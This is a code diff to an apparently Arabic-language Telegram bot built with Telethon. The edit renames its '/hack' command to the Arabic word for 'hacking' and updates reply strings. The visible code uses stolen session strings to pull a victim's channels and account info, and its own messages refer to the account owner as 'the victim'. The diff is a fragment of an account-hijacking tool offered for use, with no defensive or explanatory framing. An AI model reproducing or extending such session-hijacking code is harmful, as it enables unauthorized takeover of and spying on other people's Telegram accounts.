@@ -222,7 +222,7 @@ keyboard = [
 
       
        
-@tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
+@tgbot.on(events.NewMessage(pattern="/تهكير", func=lambda x: x.is_group))
 async def op(event):
     busr = Bot_Username.replace("@", "")
     IndianHack = [
@@ -272,11 +272,11 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه\n /hack", buttons=keyboard)
+        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه\n /تهكير", buttons=keyboard)
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
+        return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/تهكير", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
         file.write(i + "\n\nDetails BY @cr_source")
@@ -284,7 +284,7 @@ async def users(event):
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس كرستين ❤️. \n/raz", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس كرستين ❤️. \n/تهكير", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -295,9 +295,9 @@ async def users(event):
     if op:
       pass
     else:
-      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
+      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/تهكير", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس كرستين  ❤️.\n/raz", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس كرستين  ❤️.\n/تهكير", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
